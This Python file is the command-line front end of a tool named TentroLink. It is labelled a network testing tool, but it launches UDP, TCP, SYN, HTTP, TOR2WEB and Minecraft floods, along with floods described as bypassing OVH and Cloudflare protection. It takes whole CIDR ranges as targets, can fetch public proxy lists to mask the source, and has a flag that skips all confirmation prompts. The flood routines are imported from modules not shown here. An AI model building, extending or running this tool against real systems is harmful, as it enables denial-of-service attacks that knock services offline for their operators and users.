#!/usr/bin/env python3
import argparse
import sys
import os
import time
import random
import socket
import threading
from typing import List, Tuple, Dict, Any, Optional
import textwrap
import ipaddress
import shutil
import signal
import asyncio
from assets.utilities import Style, UI, AttackModule, validate_target
from assets.methods import (
    UDPFlooder,
    TCPFlooder,
    TOR2WebFlooder
)
from assets.http_methods import HTTPFlooder
from assets.syn_method import SYNFlooder
from assets.minecraft_methods import MinecraftFlooder
from assets.layer7 import OVHFlooder, CloudflareBypass

__version__ = "0.6.4"

def create_base_parser() -> argparse.ArgumentParser:
    """Create the base parser with global options"""
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('--version', action='version', 
                       version=f'TentroLink v{__version__}')
    parser.add_argument('--no-color', action='store_true',
                       help='Disable colored output')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('--proxy', type=str,
                       help='Use proxies (file path or "auto")')
    parser.add_argument('--proxy-threads', type=int, default=10,
                       help='Number of threads for proxy validation (default: 10)')
    parser.add_argument('-y', '--yes', action='store_true',
                       help='Skip all confirmation prompts')
    return parser

def create_common_args_group(parser: argparse.ArgumentParser) -> argparse._ArgumentGroup:
    """Create an argument group for common attack options"""
    group = parser.add_argument_group('Common Options')
    group.add_argument('-t', '--targets', required=True,
                      help='''Target specification. Supports:
                      - Single IP (e.g., 192.168.1.1)
                      - Multiple IPs (e.g., 192.168.1.1,192.168.1.2)
                      - CIDR notation (e.g., 192.168.1.0/24)
                      - IP range (e.g., 192.168.1.1-192.168.1.10)''')
    group.add_argument('-p', '--ports', required=False,
                      help='''Port specification (optional). Supports:
                      - Single port (e.g., 80)
                      - Multiple ports (e.g., 80,443)
                      - Port range (e.g., 80-100)
                      - Service names (e.g., http,https,dns)
                      Default: method-specific ports''')
    group.add_argument('-d', '--duration', type=int, default=60,
                      help='Duration of the attack in seconds (default: 60)')
    group.add_argument('-T', '--threads', type=int, default=5,
                      help='Number of threads per target/port combination (default: 5)')
    return group

def create_http_args_group(parser: argparse.ArgumentParser) -> argparse._ArgumentGroup:
    """Create an argument group for HTTP-specific options"""
    group = parser.add_argument_group('HTTP Options')
    group.add_argument('--method', choices=['GET', 'POST', 'HEAD'],
                      default='GET',
                      help='HTTP request method (default: GET)')
    group.add_argument('--path', default='/',
                      help='URL path for requests (default: /)')
    return group

# Target handling and validation
class TargetManager:
    @staticmethod
    def parse_targets(target_input: str, skip_prompt: bool = False) -> List[str]:
        """Parse target input into a list of IP addresses"""
        targets = []
        
        # Split by comma
        target_parts = [t.strip() for t in target_input.split(',')]
        
        for part in target_parts:
            # First try to validate as URL/hostname
            ip, is_valid = validate_target(part, skip_prompt)
            if ip:
                if is_valid or skip_prompt:
                    UI.print_success(f"Successfully validated target: {part} -> {ip}")
                    targets.append(ip)
                else:
                    UI.print_warning(f"Target {part} ({ip}) appears to be offline")
                    if skip_prompt or input(f"{Style.BOLD}Add anyway? (y/n): {Style.RESET}").lower() == 'y':
                        targets.append(ip)
                continue
                
            # If not a valid URL/hostname, try CIDR/IP validation
            if '/' in part:
                try:
                    network = ipaddress.ip_network(part, strict=False)
                    targets.extend([str(ip) for ip in network.hosts()])
                except ValueError:
                    UI.print_error(f"Invalid CIDR notation: {part}")
            elif '-' in part:
                try:
                    start, end = part.split('-')
                    if '.' not in end:
                        prefix = start.rsplit('.', 1)[0]
                        end = f"{prefix}.{end}"
                    
                    start_ip = ipaddress.IPv4Address(start)
                    end_ip = ipaddress.IPv4Address(end)
                    
                    ip_count = int(end_ip) - int(start_ip) + 1
                    if ip_count > 100:
                        UI.print_info(f"Processing large IP range: {ip_count} addresses")
                    
                    current = start_ip
                    while current <= end_ip:
                        targets.append(str(current))
                        current += 1
                except (ValueError, IndexError):
                    UI.print_error(f"Invalid IP range: {part}")
            else:
                try:
                    ipaddress.ip_address(part)
                    targets.append(part)
                except ValueError:
                    UI.print_error(f"Invalid target: {part}")
        
        return targets

    @staticmethod
    def parse_ports(port_input: str) -> List[int]:
        """Parse port input into a list of port numbers"""
        ports = []
        
        # Split by comma
        port_parts = [p.strip() for p in port_input.split(',')]
        
        for part in port_parts:
            # Check if it's a range like 80-100
            if '-' in part:
                try:
                    start, end = map(int, part.split('-'))
                    if start > end:
                        UI.print_warning(f"Port range reversed: {part} (correcting)")
                        start, end = end, start
                    
                    # Show progress for large port ranges
                    if end - start > 1000:
                        UI.print_info(f"Processing large port range: {start}-{end}")
                        
                    ports.extend(range(start, end + 1))
                except ValueError:
                    UI.print_error(f"Invalid port range: {part}")
            # Common port names
            elif part.lower() in {'http', 'https', 'ftp', 'ssh', 'telnet', 'smtp', 'dns'}:
                port_map = {
                    'http': 80, 'https': 443, 'ftp': 21, 'ssh': 22, 
                    'telnet': 23, 'smtp': 25, 'dns': 53
                }
                UI.print_info(f"Using standard port for {part}: {port_map[part.lower()]}")
                ports.append(port_map[part.lower()])
            # Single port
            else:
                try:
                    port = int(part)
                    if 1 <= port <= 65535:
                        ports.append(port)
                    else:
                        UI.print_error(f"Port out of range (1-65535): {part}")
                except ValueError:
                    UI.print_error(f"Invalid port: {part}")
        
        return ports

def get_default_ports(method: str) -> List[int]:
    """Get default ports based on attack method"""
    default_ports = {
        'udp': [53],         # Default DNS port for UDP flood
        'syn': [80, 443],    # Common web ports for SYN flood
        'http': [80, 443],   # Standard HTTP/HTTPS ports
        'minecraft': [25565]  # Default Minecraft server port
    }
    return default_ports.get(method, [80])  # Default to port 80 if method not found

def signal_handler(signum, frame):
    """Handle Ctrl+C interrupt"""
    global active_flooder
    if active_flooder:
        UI.print_warning("\nStopping operation gracefully...")
        active_flooder.stop()
        active_flooder = None  # Clear the reference
    sys.exit(1)  # Force exit after stopping

def main():
    # Add force_exit flag
    global active_flooder
    active_flooder = None

    # Setup signal handlers for both SIGINT (Ctrl+C) and SIGTERM
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Check for color support
    if 'NO_COLOR' in os.environ or not sys.stdout.isatty():
        Style.disable_colors()
    
    # Display banner
    UI.print_banner()
    
    # Create the base parser for global options
    base_parser = create_base_parser()
    
    # Create the main parser that inherits from base_parser
    parser = argparse.ArgumentParser(
        description=f"""
{Style.BLUE}╔════════════════════════════════════════════════╗
║  TentroLink - Network Testing & Analysis Tool  ║
╚════════════════════════════════════════════════╝{Style.RESET}

{Style.BOLD}Description:{Style.RESET}
  A comprehensive toolkit for network testing and analysis.
  Supports multiple attack methods with customizable parameters.

{Style.BOLD}Features:{Style.RESET}
  • UDP/TCP Flooding     • SYN Flooding
  • HTTP Request Flood   • TOR2WEB Gateway Flood
  • Minecraft Protocol   • Proxy Support
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        parents=[base_parser]
    )

    # Create subparsers with better formatting
    subparsers = parser.add_subparsers(
        title=f'{Style.BOLD}Available Methods{Style.RESET}',
        dest='command',
        metavar=f'{Style.BLUE}METHOD{Style.RESET}'
    )

    # Update parser headings
    parser._positionals.title = f'{Style.BLUE}Commands{Style.RESET}'
    parser._optionals.title = f'{Style.BLUE}Global Options{Style.RESET}'

    # If no command is provided, print custom help with examples
    if len(sys.argv) == 1:
        parser.print_help()
        print(f"""
{Style.BOLD}Examples:{Style.RESET}
  Basic UDP Flood:    {Style.DIM}./main.py udp -t example.com -p 80{Style.RESET}
  HTTP Flood:         {Style.DIM}./main.py http -t example.com -T 10{Style.RESET}
  Multi-Target TCP:   {Style.DIM}./main.py tcp -t 192.168.1.1,192.168.1.2{Style.RESET}
  With Proxies:       {Style.DIM}./main.py syn -t example.com --proxy auto{Style.RESET}
""")
        sys.exit(1)

    # UDP Flood parser with enhanced help
    udp_parser = subparsers.add_parser('udp', 
        help='UDP flood operation',
        description='Launch a UDP flood attack against specified targets and ports',
        parents=[base_parser])  # Include global options
    create_common_args_group(udp_parser)
    
    # SYN Flood parser
    syn_parser = subparsers.add_parser('syn',
        help='SYN flood operation',
        description='Launch a TCP SYN flood attack against specified targets',
        parents=[base_parser])  # Include global options
    create_common_args_group(syn_parser)
    
    # HTTP Flood parser with fixed help text
    http_parser = subparsers.add_parser('http',
        help='HTTP flood operation',
        description='Launch an HTTP flood attack against web servers',
        parents=[base_parser])  # Include global options
    create_common_args_group(http_parser)
    create_http_args_group(http_parser)

    # Add TCP Flood parser
    tcp_parser = subparsers.add_parser('tcp',
        help='TCP flood operation',
        description='Launch a TCP flood attack against specified targets',
        parents=[base_parser])
    create_common_args_group(tcp_parser)

    # Add TOR2WEB parser
    tor2web_parser = subparsers.add_parser('tor2web',
        help='TOR2WEB flood operation',
        description='Launch a flood attack through TOR2WEB gateways',
        parents=[base_parser])
    create_common_args_group(tor2web_parser)  # Using common args

    # Add Minecraft parser
    minecraft_parser = subparsers.add_parser('minecraft',
        help='Minecraft server flood operation',
        description='Launch a Minecraft protocol flood attack against servers',
        parents=[base_parser])
    create_common_args_group(minecraft_parser)  # Using common args

    # Add OVH parser
    ovh_parser = subparsers.add_parser('ovh',
        help='OVH bypass flood operation',
        description='Launch a flood attack with OVH bypass',
        parents=[base_parser])
    create_common_args_group(ovh_parser)  # Using common args
    create_http_args_group(ovh_parser)  # Add HTTP options for OVH

    # Add Cloudflare parser
    cf_parser = subparsers.add_parser('cloudflare',
        help='Cloudflare bypass flood operation',
        description='Launch a flood attack with Cloudflare bypass',
        parents=[base_parser])
    create_common_args_group(cf_parser)  # Using common args
    create_http_args_group(cf_parser)  # Add HTTP options for Cloudflare

    # Parse arguments
    args = parser.parse_args()
    
    # Handle global options
    if args.no_color:
        Style.disable_colors()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    # Parse targets and ports
    targets = TargetManager.parse_targets(args.targets, args.yes)
    ports = TargetManager.parse_ports(args.ports) if args.ports else get_default_ports(args.command)
    
    if not targets:
        UI.print_error("No valid targets specified")
        sys.exit(1)
    
    if not ports:
        UI.print_error("Invalid port specification")
        sys.exit(1)
        
    # If using default ports, show info message
    if not args.ports:
        UI.print_info(f"Using default ports for {args.command}: {', '.join(map(str, ports))}")
    
    # Show summary of targets and ports
    UI.print_targets_summary(targets, ports)
    
    # Warn about large operations
    operation_size = len(targets) * len(ports) * args.threads
    if operation_size > 1000 and not args.yes:
        UI.print_warning(f"This operation will create {operation_size} connections.")
        confirmation = input(f"{Style.BOLD}Are you sure you want to continue? (y/n): {Style.RESET}")
        if confirmation.lower() != 'y':
            UI.print_info("Operation cancelled by user")
            sys.exit(0)
    
    # After parsing arguments but before creating the flooder
    proxy_manager = None
    if args.proxy:
        from assets.proxy import ProxyManager
        proxy_manager = ProxyManager(debug=args.verbose)
        
        # First try to use cached proxies
        if proxy_manager.has_valid_proxies():
            UI.print_info("Using existing proxy cache")
        # If no valid cached proxies, get new ones
        else:
            UI.print_info("Getting fresh proxies...")
            if args.proxy.lower() == 'auto':
                # List of public proxy sources
                proxy_sources = [
                    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
                    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
                    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt',
                    'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt'
                ]
                total_proxies = proxy_manager.download_proxies(proxy_sources)
                if total_proxies == 0:
                    UI.print_error("No proxies downloaded. Continuing without proxies.")
                    proxy_manager = None
            else:
                # Load proxies from file
                try:
                    with open(args.proxy, 'r') as f:
                        proxies = [line.strip() for line in f if line.strip()]
                        for proxy in proxies:
                            proxy_manager.proxies.put(proxy)
                except Exception as e:
                    UI.print_error(f"Failed to load proxy file: {e}")
                    sys.exit(1)

            if proxy_manager and proxy_manager.proxies.qsize() > 0:
                valid_count = proxy_manager.validate_proxies(args.proxy_threads)
                if valid_count == 0:
                    UI.print_error("No valid proxies found. Continuing without proxies.")
                    proxy_manager = None

    # Execute the selected operation
    try:
        if args.command == 'udp':
            active_flooder = UDPFlooder(
                targets=targets,
                ports=ports,
                duration=args.duration,
                threads=args.threads,
                proxy_manager=proxy_manager,
                skip_prompt=args.yes
            )
            active_flooder.start()
        elif args.command == 'tcp':
            try:
                active_flooder = TCPFlooder(
                    targets=targets,
                    ports=ports,
                    duration=args.duration,
                    threads=args.threads,
                    proxy_manager=proxy_manager,
                    skip_prompt=args.yes,
                    debug=args.verbose  # Add debug flag
                )
                # Ensure monitor thread is started properly
                active_flooder.start()
            except Exception as e:
                UI.print_error(f"Error starting TCP flood: {e}")
                if args.verbose:
                    import traceback
                    traceback.print_exc()
                sys.exit(1)
        elif args.command == 'syn':
            active_flooder = SYNFlooder(
                targets=targets,
                ports=ports,
                duration=args.duration,
                threads=args.threads,
                proxy_manager=proxy_manager,
                skip_prompt=args.yes
            )
            active_flooder.start()
        elif args.command == 'http':
            active_flooder = HTTPFlooder(
                targets=targets,
                ports=ports,
                duration=args.duration,
                threads=args.threads,
                method=args.method,
                path=args.path,
                proxy_manager=proxy_manager,
                skip_prompt=args.yes
            )
            active_flooder.start()
        elif args.command == 'tor2web':
            # Import needed for TOR2WEB flood
            active_flooder = TOR2WebFlooder(
                targets=targets,
                ports=[80],  # TOR2WEB uses HTTP/HTTPS
                duration=args.duration,
                threads=args.threads,
                skip_prompt=args.yes
            )
            active_flooder.start()
        elif args.command == 'minecraft':
            try:
                from assets.minecraft_methods import MinecraftFlooder
            except ImportError as e:
                if "mcstatus" in str(e):
                    UI.print_error("Missing required module 'mcstatus'. Please install it with: pip install mcstatus")
                else:
                    UI.print_error(f"Error importing Minecraft module: {e}")
                sys.exit(1)
                
            active_flooder = MinecraftFlooder(
                targets=targets,
                ports=ports if ports else [25565],
                duration=args.duration,
                threads=args.threads,
                debug=args.verbose,
                skip_prompt=args.yes
            )
            try:
                asyncio.run(active_flooder.start())
            except KeyboardInterrupt:
                asyncio.run(active_flooder.stop())  # Properly await stop
                sys.exit(0)
            except Exception as e:
                if args.verbose:
                    UI.print_error(f"Minecraft flood error: {str(e)}")
                sys.exit(1)
        elif args.command == 'ovh':
            active_flooder = OVHFlooder(
                targets=targets,
                ports=ports,
                duration=args.duration,
                threads=args.threads,
                path=args.path,
                proxy_manager=proxy_manager,
                skip_prompt=args.yes
            )
            active_flooder.start()
        elif args.command == 'cloudflare':
            active_flooder = CloudflareBypass(
                targets=targets,
                ports=ports,
                duration=args.duration,
                threads=args.threads,
                path=args.path,
                proxy_manager=proxy_manager,
                skip_prompt=args.yes
            )
            active_flooder.start()
    except KeyboardInterrupt:
        if active_flooder:
            if hasattr(active_flooder, "stop_now"):
                active_flooder.stop_now()
            else:
                active_flooder.stop()
        sys.exit(0)

    # Start showing stats
    active_flooder.show_stats()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # This should now be handled by the signal handler
        pass
    except Exception as e:
        print(f"\n{Style.ERROR}An unexpected error occurred: {e}{Style.RESET}")
        sys.exit(1)
